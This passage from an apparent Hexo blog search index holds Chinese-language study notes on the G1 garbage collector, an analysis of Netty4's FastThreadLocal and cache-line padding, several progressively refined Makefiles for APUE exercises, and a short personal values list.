</li><li>TLAB机制或产生内存浪费，因为一个对象不会分配在两个TLAB区域，所以TLAB最末端的尾巴区域可能会残留空着。可以通过TLABRefillWasteFraction参数调整，表示允许产生浪费的比例。默认值是64，即表示1/64空间可以浪费。</li><li>TLAB大小可以自动调整，但是上限不会超过HR的一半。、</li><li>可以使用参数-XX:-ResizeTLAB禁用ResizeTLAB，并使用参数-XX:TLABSize指定一个大小。-XX:+PrintTLAB可以跟踪TLAB工作情况。</li><li><strong>一般不建议修改TLAB参数，建议使用默认值</strong></li></ul><p>TLAB快速分配的代码在 HeapWord* CollectedHeap::allocate_from_tlab…  </p><h2 id="G1的Refine线程"><a href="#G1的Refine线程" class="headerlink" title="G1的Refine线程"></a>G1的Refine线程</h2><p>先讲Rset</p><h3 id="Rset"><a href="#Rset" class="headerlink" title="Rset"></a>Rset</h3><p>Rset是干什么用的？  </p><ul><li>Rset是一种抽象概念，记录了在不同代际之间的引用关系，目的是为了加速GC。</li><li>通俗地说，可以用Rset记录从非收集部分指向收集部分的指针集合。对于这种记录述求，有两种方式，一是<code>我引用了谁</code>，称为<code>Point Out</code>；一是<code>谁引用了我</code>，称为<code>Point In</code>。G1采用后者。</li><li>G1中需要记录代际之间的引用关系包括：老生代分区到新生代分区之间的引用关系(YGC时，这个引用关系是GC Roots的一部分，老生代引用过来的不能被回收掉嘛…)；老生代分区到老生代分区之间的引用关系(混合GC时用)</li><li>Rset与卡表的关系参见P68图4-1</li><li>G1引入了PRT，TODO：没看太懂</li><li>DCQ与Refinemnet zone的四色区域没看太懂</li></ul><h3 id="Rset写屏障"><a href="#Rset写屏障" class="headerlink" title="Rset写屏障"></a>Rset写屏障</h3><p>为啥谈到写屏障，因为Refine是线程关注的是应用关系的变更，但是他是如何识别引用关系的变更的呢？就是靠写屏障完成。下面讲写屏障相关要点：  </p><ul><li>写屏障这个词我不知道为啥这样命名，直觉上不好理解。  </li><li>我对其的理解就是，写操作前后的拦截器处理。比如我对字段赋值putfield，在赋值前我要告诉DCQ这个对象被我引用了，这就是写屏障动作。  </li><li>书上的说法：<code>写屏障</code>是指在改变特定内存的值时，额外执行的一些动作。  </li><li>CMS是通过写屏障记录引用刮不洗，G1也是。  </li><li>写屏障会有优化，不是所有的引用关系变更都会被记录。  <ul><li>不记录新生代到新生代的引用，或者新生代到老生代的引用，在写屏障时过滤</li><li>过滤掉同一个分区内部引用，在Rset处理时过滤</li><li>过滤掉空引用，在Rset处理时过滤</li></ul></li></ul><h3 id="Refine线程"><a href="#Refine线程" class="headerlink" title="Refine线程"></a>Refine线程</h3><ul><li>Refine线程是一组，是一个线程池，不是一个。</li><li>我对他的理解是，一个线程用于抽样，主要作用设置新生代分区的个数。其余线程用于管理Rset，Rset的更新不是同步完成的，是靠Refine线程异步完成的，异步又是靠DCQ dirty card queue队列暂存过渡的。 </li><li>Refine涉及的JVM比较复杂，未细细研究</li><li>相关参数：可以通过-XX:+G1TraceConcRefinement观察Refine线程工作情况。通过-XX:+G1SummarizeRSetStats观察Rset更新。</li></ul><h2 id="新生代回收"><a href="#新生代回收" class="headerlink" title="新生代回收"></a>新生代回收</h2><p>上面已经讲了，G1 GC分三种： <code>新生代回收</code>young、<code>混合回收</code>(mixed，既收集新生代也收集部分老年代)、<code>FUll GC</code>  </p><p>步骤：  </p><ol><li>选择CSet</li><li>根处理</li><li>Rset处理</li><li>复制</li><li>Redirty 重构Rset</li><li>释放空间  </li></ol><h3 id="相关日志"><a href="#相关日志" class="headerlink" title="相关日志"></a>相关日志</h3><p>可以用-XX:G1LogLevel=finest 打开更详细的日志<br>关键字 GC pause (G1 Evacuation Pause) (young)， 0.0182341 secs…  </p><h3 id="参数调优"><a href="#参数调优" class="headerlink" title="参数调优"></a>参数调优</h3><h2 id="混合回收"><a href="#混合回收" class="headerlink" title="混合回收"></a>混合回收</h2><p><code>混合回收</code>分成两个阶段：</p><ul><li>并发标记阶段</li><li>垃圾回收阶段(与新生代回收一致)  </li></ul><p>并发标记阶段又分四个步骤：</p><ol><li>初始标记子阶段(initital-mark)</li><li>并发标记子阶段(concurrent-mark)</li><li>再标记子阶段(remark,STW)</li><li>清理子阶段(cleanup,STW</li></ol><p>并发标记的难点：<br>正在标记过程中的对象引用关系发生了改变。<br>通过三色标记法与STAB算法结合写屏障完成。<br>写屏障代码在 oop_store中,oop.inline.hpp  </p><h3 id="相关日志-1"><a href="#相关日志-1" class="headerlink" title="相关日志"></a>相关日志</h3><p>关键字 GC pause (G1 Evacuation Pause) (mixed)， 0.0106341 secs…<br> GC pause (G1 Evacuation Pause) (young) (initial-mark),….  // 初始标记借用了YGC<br>[GC concurrent-mark-start]…<br>[GC concurrent-mark-end]…<br>[GC remark …]…<br>[GC cleanup …]…  </p><h3 id="参数调优-1"><a href="#参数调优-1" class="headerlink" title="参数调优"></a>参数调优</h3><h2 id="Full-GC"><a href="#Full-GC" class="headerlink" title="Full GC"></a>Full GC</h2><p>JDK10之前FGC是串行的，JDK10之后支持并行。<br>代码在 G1CollectedHeap::do_collection<br>串行回收采用标记清除算法，步骤：  </p><ol><li>标记活跃对象</li><li>计算新对象地址</li><li>把所有对象都更新到新地址上</li><li>移动对象完成压缩</li></ol><h3 id="相关日志-2"><a href="#相关日志-2" class="headerlink" title="相关日志"></a>相关日志</h3><p>[Full GC (Allocation Failure) …..  0.2036229 secs]….  </p><h2 id="G1调优"><a href="#G1调优" class="headerlink" title="G1调优"></a>G1调优</h2><p>主要涉及的指标有： 吞吐量最大、停段时间尽量端、GC频率尽量低和堆空间的有效利用率高。<br>主要调优参数 参见P244 表11-2，主要涉及堆、RSet、标记和GC四个方面的参数。</p>]]></content>
    
    
    <categories>
      
      <category>book-paper-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Netty4 FastThreadLocal及CPU cacheline padding补齐</title>
    <link href="/2020/04/19/netty4-fastthhreadlocal/"/>
    <url>/2020/04/19/netty4-fastthhreadlocal/</url>
    
    <content type="html"><![CDATA[<h2 id="FastThreadLocal"><a href="#FastThreadLocal" class="headerlink" title="FastThreadLocal"></a>FastThreadLocal</h2><p>概述： ThreadLocal的一个特定变种改善，有更好的存取性能。<br>内部采用一个数组来代替ThreadLocal内部的hash表来存放变量。虽然这看起来是微不足道的，但是他确实比hash表性能好那么一点，在频繁存取时会更明显。 如果用DefaultThreadFactory创建线程，那么默认创建出来的就是FastThreadLocalThread，就会用FastThreadLocal。  </p><p>set数据靠InternalThreadLocalMap维护，InternalThreadLocalMap内部靠一个数组(就是上面说的)维护变量数据。  </p><p>扩展了什么:<br>按ThreadLocal API的约定行为，依赖InternalThreadLocalMap实现了这些行为，诸如get、set、remove等。<br>remove支持onRemoval回调。  </p><h2 id="InternalThreadLocalMap"><a href="#InternalThreadLocalMap" class="headerlink" title="InternalThreadLocalMap"></a>InternalThreadLocalMap</h2><h3 id="自身实例获取"><a href="#自身实例获取" class="headerlink" title="自身实例获取"></a>自身实例获取</h3><p>get方法是对外暴露去自身实例的，有两种方式取到InternalThreadLocalMap实例：</p><ul><li>如果当前线程是FastThreadLocalThreadInternal，直接取其实例变量ThreadLocalMap，内部称之为fastGet。  </li><li>如果是JDK的Thread，那么靠JDK的TheadLocal取到ThreadLocalMap，内部称之为slowGet。  </li></ul><h3 id="数据存取"><a href="#数据存取" class="headerlink" title="数据存取"></a>数据存取</h3><p>真正的存取变量是靠<code>indexedVariable</code>和<code>setIndexedVariable</code>方法完成。<br>阅读代码不难发现，是靠Object[]  indexedVariables这个数组达成数据存储的目的。  </p><h3 id="存放数据的数组扩容"><a href="#存放数据的数组扩容" class="headerlink" title="存放数据的数组扩容"></a>存放数据的数组扩容</h3><p>indexedVariables数组靠expandIndexedVariableTableAndSet动态扩容。初始长度是32。<br>扩容算法有点意思，是比当前index小的最大的2的n次方的值扩一倍，比如当前index是132，那么就会扩成256长度的数组。  </p><pre><code class="hljs java">Object[] oldArray = indexedVariables;<span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> oldCapacity = oldArray.length;<span class="hljs-keyword">int</span> newCapacity = index;newCapacity |= newCapacity &gt;&gt;&gt;  <span class="hljs-number">1</span>;newCapacity |= newCapacity &gt;&gt;&gt;  <span class="hljs-number">2</span>;newCapacity |= newCapacity &gt;&gt;&gt;  <span class="hljs-number">4</span>;newCapacity |= newCapacity &gt;&gt;&gt;  <span class="hljs-number">8</span>;newCapacity |= newCapacity &gt;&gt;&gt; <span class="hljs-number">16</span>;newCapacity ++;</code></pre><h3 id="是否完全用数组存放数据？"><a href="#是否完全用数组存放数据？" class="headerlink" title="是否完全用数组存放数据？"></a>是否完全用数组存放数据？</h3><p>不完全是。因为<code>InternalThreadLocalMap</code>的父类<code>UnpaddedInternalThreadLocalMap</code>自带了一些常用的字段：  </p><ul><li>futureListenerStackDepth</li><li>localChannelReaderStackDepth</li><li>handlerSharableCache  </li><li>counterHashCode</li><li>random</li><li>typeParameterMatcherGetCache</li><li>typeParameterMatcherFindCache</li><li>stringBuilder</li><li>charsetEncoderCache</li><li>charsetDecoderCache</li><li>arrayList<br>这个11个是靠实例字段直接存储。<br>另外此类，还用了padding补齐的手段优化了CPU cacheline伪共享的问题。我猜测性能提升主要来源于此。  </li></ul><pre><code class="hljs java"><span class="hljs-comment">// Cache line padding (must be public)</span><span class="hljs-comment">// With CompressedOops enabled, an instance of this class should occupy at least 128 bytes.</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">long</span> rp1, rp2, rp3, rp4, rp5, rp6, rp7, rp8, rp9;</code></pre><h3 id="关于padding补齐"><a href="#关于padding补齐" class="headerlink" title="关于padding补齐"></a>关于padding补齐</h3><p>该类为了解决cache line伪共享的问题，采用了padding补齐。<br>该类(4.1.32.Final版本)补齐后通过<a href="https://gitee.com/xiaguangme/sizeofobject" target="_blank" rel="noopener">sizeOfObject</a>(也可以用jol)算出来大小是136。  jol针对idea是有插件的，不像JDK带的jol要运行起来才能计算对象大小。idea那个插件是针对语法树分析后算的，因为就算你的类有编译错误，他也能算出来。使用时注意选择相应的压缩模式，右上角。<br>关于jol<a href="http://hg.openjdk.java.net/code-tools/jol/file/833f68a6ba34/jol-samples/src/main/java/org/openjdk/jol/samples/JOLSample_02_Alignment.java" target="_blank" rel="noopener">有官方的sample</a>是很不错的，还<a href="http://zhongmingmao.me/2016/07/01/jvm-jol-tutorial-1/" target="_blank" rel="noopener">有个博客</a>写的还行，包括字段重排等都有。   </p><p><strong>为什么是136？按说128就行啊</strong>？ 这个事情我之前也思索了好久没有答案。直至翦哥今天跟我提到了一个别人前几天<a href="https://github.com/netty/netty/issues/9284" target="_blank" rel="noopener">提的issue</a>，才翻到原来有人和我们有一样的困惑，而且答案竟然是在netty版本迭代过程中InternalThreadLocalMap的父类加了个字段：ArrayList<Object> arrayList;，导致变成了136，之前4.0.33Final版本就是128，我确实使用了这个版本进行了验证，确实是。…. 竟然是这样，不可思议。  </p><blockquote><p>jiangxinlingdu commented 2 days ago<br>I have checked the code in old version and found that the size of InternalThreadLocalMap is 128Bytes in version 4.0.33. And now in latest code in github the size of InternalThreadLocalMap is 136. And the reason is that some has added two parameters: cleanerFlags (in class InternalThreadLocalMap) and arrayList (in parent class UnpaddedInternalThreadLocalMap).<br>In my view, the contributors has pushed the two parameters ignoring the Cache line padding. So it is a problem!  </p></blockquote><blockquote><p>My doubt is solved by you, thank you!!!</p></blockquote><h2 id="FastThreadLocalThread与FastThreadLocalRunnable"><a href="#FastThreadLocalThread与FastThreadLocalRunnable" class="headerlink" title="FastThreadLocalThread与FastThreadLocalRunnable"></a>FastThreadLocalThread与FastThreadLocalRunnable</h2><p>FastThreadLocalThread概述：绑定了<code>InternalThreadLocalMap</code>的线程类。继承于JDK的<code>Thread</code>。<br>FastThreadLocalThread扩展了什么：  </p><ul><li>主要对外暴露了获取与设置<code>InternalThreadLocalMap</code>字段的接口。  </li><li>增加cleanupFastThreadLocals字段并在有Runnable参数的构造函数里，会将<code>cleanupFastThreadLocals</code>字段设置成true。</li></ul><p>因为如果通过FastThreadnLocalThread的有Runnable参数的构造函数构造的FastThreadLocalThread实例时，会将Runnable实例wrap成<code>FastThreadLocalRunnable</code>实例。  FastThreadLocalRunnable又会在其run方法中以finally的方式进行清理当前线程上所有的<code>FastThreadLocal</code>实例中的数据。  </p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">try</span> &#123;        runnable.run();    &#125; <span class="hljs-keyword">finally</span> &#123;        FastThreadLocal.removeAll();    &#125;&#125;</code></pre><p>所以<code>cleanupFastThreadLocals</code>字段意思是此线程<code>会</code>在执行完成时清理当前线程上所有的<code>FastThreadLocal</code>实例中的数据。  </p><p>FastThreadLocalRunnable扩展了什么：  </p><ul><li>如上面所说，会在run方法中用finally清理当前线程上所有的<code>FastThreadLocal</code>实例中的数据。  </li></ul><h2 id="DefaultThreadFactory"><a href="#DefaultThreadFactory" class="headerlink" title="DefaultThreadFactory"></a>DefaultThreadFactory</h2><p>扩展了什么：  </p><ul><li>实现了线程名前缀+自增线程号的模式 </li><li>实现了创建线程时默认使用<code>FastThreadLocalThread</code>实现</li></ul>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty4源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>几个递进的make file</title>
    <link href="/2020/04/19/some-make-files/"/>
    <url>/2020/04/19/some-make-files/</url>
    
    <content type="html"><![CDATA[<h2 id="几个递进的make-file"><a href="#几个递进的make-file" class="headerlink" title="几个递进的make file"></a>几个递进的make file</h2><p>春节在家写的几个递进的make file，部分有点问题。接下来 有空我要把GNU make的手册看完。不然这方面太菜了。  </p><p><a href="https://files.cnblogs.com/files/simoncook/gun-make-manual%E4%B8%AD%E8%8B%B1%E6%96%87.zip" target="_blank" rel="noopener">GNU make手册</a><br>都需要make先设置环境变量BUILD_MODE为run或者debug</p><h3 id="1-源文件名-目标都hard-code，且一次编译多个目标"><a href="#1-源文件名-目标都hard-code，且一次编译多个目标" class="headerlink" title="1 源文件名 目标都hard code，且一次编译多个目标"></a>1 源文件名 目标都hard code，且一次编译多个目标</h3><pre><code class="hljs shell">PROJECT_ROOT = $(dir $(abspath $(lastword $(MAKEFILE_LIST))))OBJS = lsdemo.o test.oifeq ($(BUILD_MODE),debug)CFLAGS += -gelse ifeq ($(BUILD_MODE),run)CFLAGS += -O2else<span class="hljs-meta">$</span><span class="bash">(error Build mode $(BUILD_MODE) not supported by this Makefile)</span>endifall:lsdemo testlsdemo:lsdemo.o<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span>lsdemo.o:$(PROJECT_ROOT)/ch01/lsdemo.c<span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span>test:test.o<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span>test.o:$(PROJECT_ROOT)/ch01/test.c<span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span>clean:rm -fr lsdemo test  $(OBJS)</code></pre><h3 id="2-通过OBJS变量定义多个目标文件-通过遍历ch01-目录下所有c文件作为源文件"><a href="#2-通过OBJS变量定义多个目标文件-通过遍历ch01-目录下所有c文件作为源文件" class="headerlink" title="2 通过OBJS变量定义多个目标文件 通过遍历ch01/目录下所有c文件作为源文件"></a>2 通过OBJS变量定义多个目标文件 通过遍历ch01/目录下所有c文件作为源文件</h3><pre><code class="hljs shell">PROJECT_ROOT = $(dir $(abspath $(lastword $(MAKEFILE_LIST))))OBJS = lsdemo.o test.oifeq ($(BUILD_MODE),debug)CFLAGS += -gelse ifeq ($(BUILD_MODE),run)CFLAGS += -O2else<span class="hljs-meta">$</span><span class="bash">(error Build mode $(BUILD_MODE) not supported by this Makefile)</span>endifall:lsdemo lsdemo:$(OBJS)<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">%</span><span class="bash">.o:$(PROJECT_ROOT)/ch01/%.c</span><span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">test</span>:test.o</span><span class="hljs-meta">#</span><span class="bash">$(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">#</span><span class="hljs-meta">#</span><span class="bash">test.o:$(PROJECT_ROOT)/ch01/test.c</span><span class="hljs-meta">#</span><span class="bash">$(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span><span class="hljs-meta">#</span><span class="bash"></span>clean:rm -fr lsdemo test  $(OBJS)</code></pre><h3 id="3-ch01-ch02-多个子目录下多目标编译"><a href="#3-ch01-ch02-多个子目录下多目标编译" class="headerlink" title="3 ch01 ch02 多个子目录下多目标编译"></a>3 ch01 ch02 多个子目录下多目标编译</h3><pre><code class="hljs shell">PROJECT_ROOT = $(dir $(abspath $(lastword $(MAKEFILE_LIST))))CH01OBJS = lsdemo.o test.oCH02OBJS = test21.o test22.oifeq ($(BUILD_MODE),debug)CFLAGS += -gelse ifeq ($(BUILD_MODE),run)CFLAGS += -O2else<span class="hljs-meta">$</span><span class="bash">(error Build mode $(BUILD_MODE) not supported by this Makefile)</span>endifall:lsdemo ch02lsdemo:$(CH01OBJS)<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">%</span><span class="bash">.o:$(PROJECT_ROOT)/ch01/%.c</span><span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span>ch02:$(CH02OBJS)<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">%</span><span class="bash">.o:$(PROJECT_ROOT)/ch02/%.c</span><span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">test</span>:test.o</span><span class="hljs-meta">#</span><span class="bash">$(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">#</span><span class="hljs-meta">#</span><span class="bash">test.o:$(PROJECT_ROOT)/ch01/test.c</span><span class="hljs-meta">#</span><span class="bash">$(CC) -c $(CFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span><span class="hljs-meta">#</span><span class="bash"></span>clean:rm -fr lsdemo test  $(OBJS)</code></pre><h3 id="4-通过修改CH-NO和APP-NAME切换到底编译哪个子目录下的应用，编译到指定路径下，适用于APUE学习时例程序编写"><a href="#4-通过修改CH-NO和APP-NAME切换到底编译哪个子目录下的应用，编译到指定路径下，适用于APUE学习时例程序编写" class="headerlink" title="4 通过修改CH_NO和APP_NAME切换到底编译哪个子目录下的应用，编译到指定路径下，适用于APUE学习时例程序编写"></a>4 通过修改CH_NO和APP_NAME切换到底编译哪个子目录下的应用，编译到指定路径下，适用于APUE学习时例程序编写</h3><pre><code class="hljs shell">CH_NO = ch01APP_NAME = lsdemo<span class="hljs-meta">#</span><span class="bash"> 获取makefile路径</span>PROJECT_ROOT = $(dir $(abspath $(lastword $(MAKEFILE_LIST))))<span class="hljs-meta">$</span><span class="bash">(info MAKEFILE_LIST is: $(MAKEFILE_LIST))</span><span class="hljs-meta">$</span><span class="bash">(info PROJECT_ROOT is: $(PROJECT_ROOT))</span><span class="hljs-meta">#</span><span class="bash"> 拼接路径</span>SOURCE_FRAGMENT :=$(CH_NO)/$(APP_NAME)SOURCE_ROOT := $(PROJECT_ROOT)$(SOURCE_FRAGMENT)<span class="hljs-meta">$</span><span class="bash">(info SOURCE_ROOT is: $(SOURCE_ROOT))</span>BUILD_ROOT := $(PROJECT_ROOT)build/make.debug.linux.x86_64/$(SOURCE_FRAGMENT)/<span class="hljs-meta">$</span><span class="bash">(info BUILD_ROOT is: $(BUILD_ROOT))</span>ifeq ($(BUILD_MODE),debug)CFLAGS += -gelse ifeq ($(BUILD_MODE),run)CFLAGS += -O2else<span class="hljs-meta">$</span><span class="bash">(error Build mode $(BUILD_MODE) not supported by this Makefile)</span>endif<span class="hljs-meta">$</span><span class="bash">(shell <span class="hljs-keyword">if</span> [ ! -d $(BUILD_ROOT) ]; <span class="hljs-keyword">then</span> mkdir -p $(BUILD_ROOT); <span class="hljs-keyword">fi</span>;)</span>SOURCE := $(shell find $(SOURCE_ROOT) -name '*.c' |xargs -n1 basename)OBJS := $(SOURCE:.c=.o)<span class="hljs-meta">$</span><span class="bash">(info SOURCE is: $(SOURCE))</span><span class="hljs-meta">$</span><span class="bash">(info OBJS is: $(OBJS))</span>all: $(APP_NAME)<span class="hljs-meta">#</span><span class="hljs-meta">$</span><span class="bash">(APP_NAME):$(OBJS)</span><span class="hljs-meta">$</span><span class="bash">(CXX) -o $(BUILD_ROOT)/<span class="hljs-variable">$@</span> $(addprefix $(BUILD_ROOT), $^)</span><span class="hljs-meta">%</span><span class="bash">.o:$(SOURCE_ROOT)/%.c</span><span class="hljs-meta">$</span><span class="bash">(CC) -c $(CFLAGS) $(CPPFLAGS) -o $(BUILD_ROOT)/<span class="hljs-variable">$@</span> $&lt;</span>clean:rm -fr $(BUILD_ROOT)</code></pre><p>附上第四种情况的目录结构：</p><pre><code class="hljs shell">appweb@simon-ububtu18-desk-2:~/600.self/03.code/01.cpp/03.APUE$ tree .├── build│   └── make.debug.linux.x86_64│       └── ch01│           └── lsdemo│               ├── lsdemo│               ├── lsdemo.o│               └── test.o├── ch01│   └── lsdemo│       ├── lsdemo.c│       └── test.c└── Makefile</code></pre>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cpp</tag>
      
      <tag>makefile</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的价值观</title>
    <link href="/2020/04/19/MySenseOfWorth/"/>
    <url>/2020/04/19/MySenseOfWorth/</url>
    
    <content type="html"><![CDATA[<h2 id="我的价值观"><a href="#我的价值观" class="headerlink" title="我的价值观"></a>我的价值观</h2><ol><li>一个底线：遵纪守法，远离黄赌毒。</li><li>一个标准：感恩上进，持续努力，享受尽职。</li><li>一个方法论：三人行必有我师，三人行我亦能成师。</li><li>一个技巧：顺势而为。</li><li>一个兜底：凡事有最坏的打算。</li></ol>]]></content>
    
    
    <categories>
      
      <category>think</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
